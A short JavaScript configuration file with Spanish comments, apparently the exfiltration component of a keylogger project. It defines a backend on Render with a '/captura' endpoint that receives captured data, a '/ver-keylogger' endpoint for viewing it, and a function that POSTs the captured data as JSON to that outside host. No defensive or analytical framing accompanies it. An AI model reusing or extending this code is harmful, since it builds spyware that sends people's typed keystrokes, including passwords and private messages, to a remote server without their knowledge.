// Configuración de URLs para el proyecto
const CONFIG = {
  // URL del backend en Render
  BACKEND_URL: 'https://backend-prueba-o523.onrender.com',
  
  // URLs de los endpoints
  ENDPOINTS: {
    CAPTURA: '/captura',
    VER_DATOS: '/ver-keylogger'
  },
  
  // Funciones helper
  getEndpointUrl: function(endpoint) {
    return this.BACKEND_URL + endpoint;
  }
};

// Función para enviar datos al backend
async function enviarDatos(data) {
  try {
    const response = await fetch(CONFIG.getEndpointUrl(CONFIG.ENDPOINTS.CAPTURA), {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    });
    
    if (response.ok) {
      const result = await response.json();
      console.log('✅ Datos enviados correctamente:', result);
      return result;
    } else {
      console.error('❌ Error al enviar datos:', response.status);
    }
  } catch (error) {
    console.error('❌ Error de conexión:', error);
  }
}

// Función para abrir la página de datos capturados
function verDatosCapturados() {
  window.open(CONFIG.getEndpointUrl(CONFIG.ENDPOINTS.VER_DATOS), '_blank');
}

// Exportar para uso global
window.CONFIG = CONFIG;
window.enviarDatos = enviarDatos;
window.verDatosCapturados = verDatosCapturados;